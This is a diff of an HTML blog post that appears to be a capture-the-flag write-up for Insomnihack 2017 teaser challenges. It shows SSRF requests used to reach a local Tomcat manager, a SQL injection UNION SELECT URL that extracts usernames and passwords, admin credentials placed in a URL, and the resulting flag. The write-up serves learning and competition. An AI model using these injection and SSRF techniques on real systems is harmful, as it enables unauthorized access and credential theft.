@@ -109,6 +109,17 @@
 <p><em>Note: this article will be completed throught the week.</em></p>
 
 
+<div class="toc">
+<ul>
+<li><a href="#smarttomcat">Smarttomcat</a></li>
+<li><a href="#cryptquizz">Cryptquizz</a></li>
+<li><a href="#shobot">Shobot</a></li>
+<li><a href="#the-great-escape">The great escape</a><ul>
+<li><a href="#part-1">part 1</a></li>
+</ul>
+</li>
+</ul>
+</div>
 <h2 id="smarttomcat">Smarttomcat</h2>
 <blockquote>
 <p>Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart
@@ -120,7 +131,6 @@ down on the broken search interface... Can you help me ?</p>
 <p><img alt="smarttomact screenshot" src="/media/2017.01/site.png" /></p>
 <p>When intercepting the traffic with Burp we see that the request look like the
 following:</p>
-<p>The request look like this:</p>
 <div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">smarttomcat.teaser.insomnihack.ch</span>
 <span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span>
@@ -136,19 +146,21 @@ u=http%3A%2F%2Flocalhost%3A8080%2Findex.jsp%3Fx%3D42%26y%3D42
 </pre></div>
 
 
-<p>The server used itself as a proxy, decoded it is the following:</p>
+<p>We notice the <code>u</code> parameter which decoded is:</p>
 <div class="highlight"><pre><span></span>http://localhost:8080/index.jsp?x=42&amp;y=42
 </pre></div>
 
 
-<p>When modifying the request with a <code>lol</code>, the <code>u</code> parameter is the following:</p>
+<p>The server is using itself as a proxy, When modifying the request with a <code>lol</code>,
+the <code>u</code> parameter is the following:</p>
 <div class="highlight"><pre><span></span>u=http%3A%2F%2Flocalhost%3A8080%2Flol
 </pre></div>
 
 
-<p>And the response from the server is the following:</p>
+<p>The server response is an error which indicate us that the server is using a
+tomcat server 7.0.68.</p>
 <p><img alt="testing a bad request" src="/media/2017.01/lol.png" /></p>
-<p>We learn that this is a tomcat server, so let's see if we can get the manager:</p>
+<p>We learned that this is a tomcat server, so let's see if we can get the manager:</p>
 <div class="highlight"><pre><span></span>u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/
 </pre></div>
 
@@ -227,13 +239,22 @@ script:</p>
 </pre></div>
 
 
-<p>So it is operated by a MySQL database. Then we need to fine the right table.
-Then we get the username and password of the user:</p>
+<p>So it is operated by a MySQL database. Then we need to fine the right table.</p>
+<p>The finale request is:</p>
 <div class="highlight"><pre><span></span>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23
 </pre></div>
 
 
-<p><em>To be continued</em></p>
+<p>Then we need to authenticate, on the admin page, using the direct URL but
+authenticating as for the Smartomcat challenge just worked:</p>
+<div class="highlight"><pre><span></span>http://sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry@shobot.teaser.insomnihack.ch/?page=admin
+</pre></div>
+
+
+<p>And give us the flag:</p>
+<blockquote>
+<p>Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}</p>
+</blockquote>
 <h2 id="the-great-escape">The great escape</h2>
 <h3 id="part-1">part 1</h3>
 <blockquote>
